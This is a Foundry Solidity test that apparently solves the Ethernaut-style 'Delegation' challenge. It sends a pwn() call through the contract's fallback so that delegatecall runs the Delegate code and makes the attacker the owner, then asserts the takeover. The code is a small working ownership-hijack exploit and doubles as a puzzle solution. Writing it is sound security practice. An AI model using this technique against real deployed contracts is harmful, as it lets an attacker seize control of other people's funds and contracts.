//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Test.sol";
import "../../src/delegation/Delegation.sol";

contract DelegationTest is Test {
    address attacker;
    Delegate delegate;
    Delegation delegation;

    function setUp() public {
        attacker = makeAddr("attacker");
        delegate = new Delegate(address(this));
        delegation = new Delegation(address(delegate));
    }

    function test_attack() public {
        vm.prank(attacker);
        bytes memory data = abi.encodeWithSignature("pwn()");
        (bool success, ) = address(delegation).call(data);
        
        assertTrue(success);
        assertEq(delegation.owner(), attacker);
    }
}